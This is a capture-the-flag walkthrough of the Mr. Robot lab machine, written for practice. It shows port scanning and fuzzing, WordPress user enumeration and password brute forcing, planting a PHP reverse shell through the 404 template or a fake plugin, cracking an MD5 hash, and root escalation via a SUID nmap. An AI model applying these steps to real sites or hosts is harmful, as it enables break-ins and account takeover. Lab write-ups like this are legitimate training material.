<h1 align="center">Mr. Robot CTF Walkthrough 2021</h1>

This is a write up of the Mr. Robot CTF from the Try Hack Me platform (Also available on VulnHub). I highly recommend you do this CTF not only because of the theme of the TV show but because it's a good practice machine and it is an OSCP Like machine. Flags will not be shared, nor passwords obtained.

<p align="center"><img src="img/wall.jpg"></p>

On this machine we will see two ways (among others) of exploiting a Wordpress service due to its outdatedness and insecurity, then we will escalate privileges thanks to an old version of nmap.

**We will see all this from the perspective and methodology of a penetration test.**

- Link to the machine: [Mr. Robot](https://tryhackme.com/room/mrrobot)
- Difficulty assigned by THM: Medium
- The IP of the machine in my case will be: 10.10.198.171 (You will have a different ip so change it for all steps)

Let's get started!!!
#
<h1 align="center">Enumeration</h1>

The first thing we will do is scan the machine and see which ports are open.
To do this we will make use of nmap and use a series of flags that will make our scan faster, as port scanning on certain machines can take quite some time.

```bash
nmap -p- --open -sS -Pn --min-rate 5000 -v -n 10.10.198.171
```

The explanation of the meaning of each flag is as follows:

- ```-p-``` : We indicate that the scan will be done for all ports.
- ```--open``` : We indicate that we are only interested in ports that are open.
- ```-sS``` : This flag indicates that we want to do a "SYN Scan" which means that the packets we will send will never complete the TCP connections and that will make our scan much less intrusive and quieter.
- ```-Pn``` : With this option we indicate that we do not want to do host discovery (since we know who our target is).
- ```--min-rate 5000``` : This flag can be exchanged for ```-T5```, both are intended to make our scanning faster (and noisier...). To be more detailed this flag indicates that we don't want to send less than 5,000 packets per second.
- ```-v``` : (verbose) To see which ports appear as we go along.
- ```-n``` : We don't want DNS resolution to be performed, since we are scanning an IP, not a domain.

From which we obtain the following output:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 22:23 CEST
Initiating SYN Stealth Scan at 22:23
Scanning 10.10.198.171 [65535 ports]
Discovered open port 443/tcp on 10.10.198.171
Discovered open port 80/tcp on 10.10.198.171
Completed SYN Stealth Scan at 22:24, 26.28s elapsed (65535 total ports)
Nmap scan report for 10.10.198.171
Host is up (0.045s latency).
Not shown: 65532 filtered ports, 1 closed port
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https
```

At this point we know that there are 2 open ports: 80 (HTTP) and 443 (HTTPS), seeing this and that the SSH port is not open (at least to the outside), it can be deduced that the only way to enter the machine is through these web services.

The step par excellence once we know which ports are open is to perform a scan to those ports by running a series of scripts in order to obtain more information: server version, technology, possible vulnerabilities a priori, etc...

```bash
nmap -sV -sC -p 80,443 -Pn -n -min-rate 5000 10.10.198.171
```

Where :

- ```-sV``` : If possible, it will show the version of the service running on each port.
- ```-A``` : We will run all relevant scripts (provided by nmap) on these ports.
- ```-p 80,443```: Open ports.

Getting this output:

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-09-02 22:26 CEST
Nmap scan report for 10.10.198.171
Host is up (0.044s latency).

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd
|_http-server-header: Apache
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=www.example.com
| Not valid before: 2015-09-16T10:45:03
|_Not valid after:  2025-09-13T10:45:03
```

To find out what we are dealing with, we will run **WhatWeb**

```http://10.10.198.171 [200 OK] Apache, Country[RESERVED][ZZ], HTML5, HTTPServer[Apache], IP[10.10.198.171], Script, UncommonHeaders[x-mod-pagespeed], X-Frame-Options[SAMEORIGIN]```

It doesn't seem to have given us much information...

So let's visit the web... After an impressive and very hacker intro, we come across this menu.

<p align="center"><img src="img/1.png"></p>

After testing each of the commands and watching several videos, I did not find anything relevant, on the other hand looking at the source code of the page we can find in line 15 an IP that currently does not give us any additional information.

At this point we know the following routes:

```
/prepare
/fsociety
/inform
/question
/wakeup
/join
```

Since there seems to be no more information in sight, we will proceed to do *Fuzzing*, which consists of making requests to the server of several routes extracted from a dictionary with the objective of obtaining routes that exist. For this we will use *Wfuzz* although another powerful tool is *Ffuf*.

```bash
wfuzz -c -L --hc=404 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.198.171//FUZZ
```

- With ffuf it would be:

```bash
ffuf -u http://10.10.198.171/FUZZ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -mc 200 -c -t 200
```

The release of **Wfuzz** shows us several interesting things

<p align="center"><img src="img/2.png"></p>

Now we know that we are dealing with a CMS (Content Management System), specifically Wordpress, since there are several paths belonging to Wordpress (wp-content, wp-login, wp-includes).

On the other hand, there is also a file ```robots.txt```.

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

There are two interesting files, one seems to be the first key and the other a dictionary (are they suggesting to use it for a brute force attack?).

If we access the path ```/key-1-of-3.txt```, we will be able to visualize the first flag.
And if we access the path ```fsocity.dic```, we can download the dictionary.

In this file we can no longer do anything so let's enumerate a little more and see if there is any potential way of entry apart from the possible brute force login.

There is also a strange path ```/0``` let's take a look at it....

<p align="center"><img src="img/3.png"></p>

It seems to be a blog... I took the opportunity to consult **Wappalyzer**, revealing that it is a Wordpress 4.3.1 and that the site uses PHP 5.5.29.
#
<h1 align="center">Vulnerability Assessment</h1>

After investigating that there are no resources to exploit for SQL or XSS injections, we will continue with the dictionary we encountered earlier, so we will access the ```/wp-login``` path.

<p align="center"><img src="img/4.png"></p>

On the one hand so far we have not found any potential user names... but by testing some credentials we can observe a vulnerability...
#
<div align="center">
    <img src="img/5.png">
    <img src="img/6.png">
</div>

#
If we enter an invalid user the content manager tells us that the user is invalid, but if we enter an existing one it tells us that for that user the password is incorrect.

Thanks to this vulnerability we could enumerate possible users that are in the database, but it will not be necessary who we are interested in is Elliot (based on the thematic of the CTF we can extrapolate a series of potential names).

Reviewing the dictionary that we obtained before, I could see that there are many repeated words which will make our brute force attack based on dictionary take more time, for this we will order the dictionary and eliminate the repeated lines.

```bash
sort fsocity.dic | uniq > fsocity-sorted.dic
```
#
<h1 align="center">Exploitation</h1>

For the attack we have many tools available including **Hydra**, the intruder of **BurpSuite**... in this case, since it is a Wordpress and that based on tests was the one that took the least time, we will use **WPScan**.

Located in the directory where we have our dictionary we execute:

```bash
wpscan --url 10.10.198.171 --wp-content-dir wp-admin --usernames elliot --passwords fsocity-sorted.dic
```

<p align="center"><img src="img/7.png"></p>


- *Referring to the username, it is worth mentioning that we could have obtained it by brute-forcing the username field, with Hydra, for example ```hydra -L fsocity.dic -p test 10.10.198.171 http-post-form "/wp-login/:log=^USER^&pwd=^PASS^wp-submit=Log+In:F=Invalid username"```*

Now that we have the credentials, we log in.

<p align="center"><img src="img/8.png"></p>

At this point, I will show 2 ways to exploit this Wordpress service (there are others...) and get a reverse shell.

- By uploading a fake plugin.
- By using the 404 template

And if you want to try for yourselves you can also get a reverse shell through the upload of an image in the "Media" section, we would only have to add to our payload a header with the magic numbers of the format supported by the web and rename the payload with that format.
#
<h2 align="center">Template 404</h2>

Go to Apperance -> Editor -> Access the 404 template to edit it.

The payload that we will use to start a reverse shell, we can find it in pentestmonkey to obtain it in our machine we can execute:

```bash
https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
```

We will edit the values ```$ip``` and ```$port``` of our payload, by our IP and the port that we want to use (in my case the port 443 (this way our connection would be a little masked as a connection belonging to the web server)).

Now we will replace the content of the template 404 by the content of our payload, and we will save it.

<p align="center"><img src="img/9.png"></p>

We will initiate a listener, as we expect a connection from our victim.

```nc -lvp 443```

And simply visit a random page or even the page ```/wp-content/themes/twentyfifteen/404.php```.

As soon as we log in, we will have already obtained a shell revese to the user **daemon**.
#
<h2 align="center">Upload of a fake plugin</h2>

To do so, go to Plugins -> Add New -> Upload Plugin.

<p align="center"><img src="img/10.png"></p>


We could use the payload mentioned in the previous section as is, but it will not comply with the format of a WordPress plugin... we will have to make our payload a valid plugin, to do this we will start by adding the following header to our payload.

```
/*

Plugin Name:  Reverse Shell

Plugin URI: http://mrrobot.com

Description: Shell

Version: 1.0

Author: Shockz

Author URI: http://mrrobot.com

Text Domain: Shell

Domain Path: /languages

*/
```

Now we need to pack everything in a zip file.

```bash
sudo zip reverse.zip php-reverse-shell.php
```

We will initiate a listener, as we expect a connection from our victim.

```nc -lvp 443```

Finally we will upload our payload ```reverse.zip```.

<p align="center"><img src="img/11.png"></p>

But this is not enough, now we have to activate it, for this we go back to Plugins and click on "Activate".

<p align="center"><img src="img/12.png"></p>

As soon as we activate it, we will have already obtained a shell revese to the user **daemon**.

#
<h2 align="center">Continuing the exploitation</h2>

Either by one or the other method we have obtained a shell (or something similar, since it is a rawshell).

<p align="center"><img src="img/13.png"></p>

We are going to improve our shell and get a proper tty

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

At this point we can navigate through the file system, finding the user **robot** located in ```/home/robot```.

<p align="center"><img src="img/14.png"></p>

In this directory we can find 2 files, the second flag and what by the name seems to be a password encrypted in MD5.

If we try to see the key, we will not be able to, since the owner of this file is the user **robot** and only he can read the file and nothing else.

<p align="center"><img src="img/15.png"></p>

On the other hand we can consult the encrypted password.

So we copy it to a file on our machine, in my case I will call it ````````.

To decrypt it we will have to perform another brute force attack, this time we will use **John The Ripper** and the dictionary ```rockyou```.

```bash
john --format=raw-MD5 --wordlist=/usr/share/wordlists/rockyou.txt hash
```

<p align="center"><img src="img/16.png"></p>

Getting the password for the user **robot**.

Now in the shell we change the user and enter the credentials

```bash
su robot
```

Now being the user **robot** we will be able to visualize the 2nd flag.

#
<h1 align="center">Privilege escalation</h1>

The first thing I tried was if I could execute some command with sudo (```sudo -l```). So my second step was to try to abuse some SUID, for that we executed the following command:

```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2> /dev/null
```

<p align="center"><img src="img/17.png"></p>

What stands out here is ```/usr/local/bin/nmap```.

We can consult in [GTFOBins](https://gtfobins.github.io) the way to abuse this *capability*.

As our purpose is to obtain command execution as superuser, we find this method.

<p align="center"><img src="img/18.png"></p>

where it appears that it is only available for nmap versions between 2.02 and 5.21, so we check our version.

```
nmap -V

nmap version 3.81 ( http://www.insecure.org/nmap/ )
```

As it is valid, we proceed to abuse this SUID.

<p align="center"><img src="img/19.png"></p>

Finally we get a rawshell as root, now we just need to display the last flag in ```/root/key-3-of-3.txt```

<p align="center"><img src="img/20.jpg"></p>
